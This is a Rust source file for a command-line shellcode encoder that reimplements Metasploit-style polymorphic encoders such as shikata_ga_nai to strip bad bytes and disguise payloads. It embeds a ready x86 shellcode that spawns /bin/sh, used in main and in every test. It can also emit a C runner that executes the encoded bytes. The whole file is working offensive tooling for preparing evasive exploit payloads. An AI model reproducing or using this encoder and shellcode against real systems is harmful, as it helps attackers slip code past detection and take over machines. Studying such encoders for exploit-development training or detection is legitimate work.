#![feature(test)]

use rand::prelude::*;
use std::{
    error::Error,
    ffi::OsString,
    fmt, fs,
    io::{self, Write},
    num::ParseIntError,
    str::FromStr,
};

#[cfg(test)]
extern crate quickcheck;
#[cfg(test)]
#[macro_use(quickcheck)]
extern crate quickcheck_macros;

use lib::{
    add_sub, alpha_mixed,
    encoder::{DynEncoder, EncoderBase},
    jmp_call_additive, shikata_ga_nai, AsEscape,
};

use clap::Clap;
use rand_chacha::ChaCha20Rng;

use io::Read;

#[derive(Clap)]
#[clap(version = "0.1.0")]
struct Opts {
    /// Set a seed for the RNG
    #[clap(short, long)]
    rand: Option<RandState>,

    /// Is this binary or an escaped string?
    /// We currently only accept \x00 style escapes
    #[clap(long = "bin")]
    binary: bool,

    /// Should we output a small C file?
    #[clap(short, long, parse(from_os_str))]
    out: Option<OsString>,

    /// Input file
    #[clap(short, parse(from_os_str))]
    inp: Option<OsString>,

    /// Bad bytes, e.g. \x00\xa0
    #[clap(short, long)]
    bad: Option<String>,

    /// The shellcode
    input: Option<String>,

    /// The encoder
    encoder: Option<Encoder>,
}

#[derive(Debug)]
struct RandStateErr(Option<ParseIntError>);
impl fmt::Display for RandStateErr {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        match &self.0 {
            Some(e) => e.fmt(f),
            None => write!(f, "Random state should be 64 characters"),
        }
    }
}
#[derive(Clone)]
struct RandState([u8; 32]);
impl FromStr for RandState {
    type Err = RandStateErr;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        if s.len() != 64 {
            return Err(RandStateErr(None));
        }
        let serr = u8::from_str_radix("z", 16).unwrap_err();
        let mut ret = [0; 32];
        for (c, r) in s.as_bytes().chunks_exact(2).zip(&mut ret) {
            let s = std::str::from_utf8(c).map_err(|_| RandStateErr(Some(serr.clone())))?;
            *r = u8::from_str_radix(s, 16).map_err(|e| RandStateErr(Some(e)))?;
        }
        Ok(Self(ret))
    }
}

impl fmt::Debug for RandState {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "RandState(*b\"")?;
        for b in &self.0 {
            if (*b as char).is_ascii_alphanumeric() {
                write!(f, "{}", *b as char)?;
            } else {
                write!(f, "\\x{:02x}", b)?;
            }
        }
        write!(f, "\")")
    }
}

impl fmt::Display for RandState {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        for b in &self.0 {
            write!(f, "{:02x}", b)?;
        }
        Ok(())
    }
}

#[derive(Debug, Clone)]
enum Encoder {
    ShikataGaNai,
    AddSub,
    AlphaMixed,
    JmpCallAdditive,
}

impl Encoder {
    fn new(&self) -> EncoderBase<Box<dyn DynEncoder>> {
        match self {
            Encoder::ShikataGaNai => shikata_ga_nai::ShikataGaNai::new().into_dyn(),
            Encoder::AddSub => add_sub::AddSub::new().into_dyn(),
            Encoder::AlphaMixed => alpha_mixed::AlphaMixed::new().into_dyn(),
            Encoder::JmpCallAdditive => jmp_call_additive::JmpCallAdditive::new().into_dyn(),
        }
    }
}

#[derive(Debug, Clone, thiserror::Error)]
#[error("Invalid encoder")]
struct EncoderError;

impl FromStr for Encoder {
    type Err = EncoderError;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_ascii_lowercase().replace('_', "").as_str() {
            "shikataganai" => Ok(Self::ShikataGaNai),
            "addsub" => Ok(Self::AddSub),
            "alphamixed" => Ok(Self::AlphaMixed),
            "jmpcalladditive" => Ok(Self::JmpCallAdditive),
            _ => Err(EncoderError),
        }
    }
}

fn main() -> Result<(), Box<dyn Error>> {
    let opts = Opts::parse();

    let default_shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

    let buf = if let Some(file_name) = opts.inp {
        eprintln!("Reading from file {}", file_name.to_string_lossy());
        let mut f = fs::File::open(file_name)?;
        let mut ret = vec![];
        f.read_to_end(&mut ret)?;
        ret
    } else {
        match opts.input {
            Some(s) => {
                if s == "-" {
                    eprintln!("Reading from stdin");
                    let mut ret = vec![];
                    io::stdin()
                        .lock()
                        .read_to_end(&mut ret)
                        .map_err(|e| format!("Could not read from stdin: {}", e))?;
                    ret
                } else if opts.binary {
                    s.into_bytes()
                } else {
                    unescape(s)?
                }
            }
            None => {
                eprintln!("Choosing default shellcode");
                default_shellcode.to_vec()
            }
        }
    };

    eprintln!("Your old shellcode: {}", AsEscape(&buf));

    let RandState(seed) = opts.rand.unwrap_or_else(|| RandState(random()));
    eprintln!("RNG state: {}", RandState(seed));
    let mut rng = ChaCha20Rng::from_seed(seed);

    let badchars = match opts.bad {
        Some(s) => unescape(s)?,
        None => {
            eprintln!("Choosing default bad bytes");
            b"\x00".to_vec()
        }
    };

    eprintln!("Your bad bytes: {}", AsEscape(&badchars));

    let encoder = opts.encoder.unwrap_or(Encoder::ShikataGaNai).new();

    let encoded = encoder.encode(&mut rng, buf, &badchars)?;

    eprintln!("Your new shellcode: {}", AsEscape(&encoded));

    if let Some(file_name) = opts.out {
        eprintln!("Writing to file {}", file_name.to_string_lossy());
        let mut f = fs::File::create(file_name)?;
        write!(
            f,
            r##"#include <stdio.h>
#include <string.h>
char sc[] = "{}";
int main(void) {{
  fprintf(stdout, "Length: %d\n", strlen(sc));
  ((void(*)())sc)();
  return 0;
}}"##,
            AsEscape(&encoded)
        )?;
    }

    io::stdout().lock().write_all(&encoded)?;

    Ok(())
}

fn unescape(s: String) -> Result<Vec<u8>, Box<dyn Error>> {
    let mut ret = vec![];
    let mut part = None;

    for b in s.bytes() {
        match part {
            None => {
                if b == b'\\' {
                    part = Some(vec![])
                } else {
                    ret.push(b)
                }
            }
            Some(ref mut p) => {
                p.push(b);
                if p.len() >= 3 {
                    if p[0] != b'x' {
                        return Err("Error parsing input: Missing x".into());
                    }
                    let s = std::str::from_utf8(&p[1..])
                        .map_err(|e| format!("Error parsing input: {}", e))?;
                    let t = u8::from_str_radix(s, 16)
                        .map_err(|e| format!("Error parsing input: {}", e))?;
                    part = None;
                    ret.push(t);
                }
            }
        }
    }
    Ok(ret)
}

#[cfg(test)]
mod tests {
    use super::*;
    use quickcheck::Arbitrary;

    #[test]
    fn exploration() {
        use shikata_ga_nai::ShikataGaNai;

        let buf = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80".to_vec();
        let RandState(seed) =
            RandState::from_str("3f9327dcbeeb151bb6a75609705f9b3c595eff9986dee6ac6b46dcb1c5853d69")
                .unwrap();
        let mut rng = ChaCha20Rng::from_seed(seed);
        let badchars = b"\x00";
        let v = ShikataGaNai::new().encode(&mut rng, buf, badchars).unwrap();
        assert_eq!(v, &b"\xdb\xd3\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x06\xb8\xf8\xab\x48\x2a\x31\x47\x1a\x83\xc7\x04\x03\x47\x16\xe2\x0d\x9a\x88\x7a\x85\xf2\x27\x08\x3d\x65\x17\x8c\xd4\x1b\xee\xb3\x76\xb7\x79\xd2\xc6\x3c\xb7\x95\x26\x43\x47\x96"[..]);
    }

    #[test]
    fn aaa() {
        use shikata_ga_nai::ShikataGaNai;

        let buf = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80".to_vec();
        let seed = *b"Z7\x5b\x5f\x015\x1f\x18\x06\x1b\x3a2IKL\x21S\x11\x0c\x0c\x2f\x215\x60\x186S\x08\x60\x5b6\x1f";
        let mut rng = ChaCha20Rng::from_seed(seed);
        let badchars = b"\x00";
        let v = ShikataGaNai::new().encode(&mut rng, buf, badchars).unwrap();
        assert_eq!(v, &b"\xdd\xc1\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x06\xb8\xa6\xb6\x64\x10\x31\x43\x1a\x03\x43\x1a\x83\xc3\x04\xe2\x53\x87\xa4\x40\xf3\xc7\x0b\x12\x6b\x70\x7b\xb6\x02\xee\x0a\xd5\x84\xbd\x85\xfb\x94\x49\x5b\x7b\xd4\x4d\x63\x7c"[..]);
    }

    extern crate test;
    use test::{black_box, Bencher};
    #[bench]
    fn bench_all(b: &mut Bencher) {
        use crate::shikata_ga_nai::ShikataGaNai;

        let buf = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80".to_vec();
        let seed = *b"Z7\x5b\x5f\x015\x1f\x18\x06\x1b\x3a2IKL\x21S\x11\x0c\x0c\x2f\x215\x60\x186S\x08\x60\x5b6\x1f";
        let mut rng = ChaCha20Rng::from_seed(seed);
        let badchars = b"\x00";
        b.iter(|| {
            black_box(
                ShikataGaNai::new()
                    .encode(&mut rng, buf.clone(), badchars)
                    .unwrap(),
            )
        })
    }

    impl Arbitrary for RandState {
        fn arbitrary<G: quickcheck::Gen>(g: &mut G) -> Self {
            let mut seed = [0; 32];
            for x in &mut seed {
                *x = u8::arbitrary(g)
            }
            Self(seed)
        }
    }

    #[quickcheck]
    fn qc_end_to_end(RandState(seed): RandState) -> bool {
        use shikata_ga_nai::ShikataGaNai;

        let buf = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80".to_vec();
        let mut rng = ChaCha20Rng::from_seed(seed);
        let badchars = b"\x00";
        let v = ShikataGaNai::new().encode(&mut rng, buf, badchars).unwrap();
        v.len() == 54
    }
}
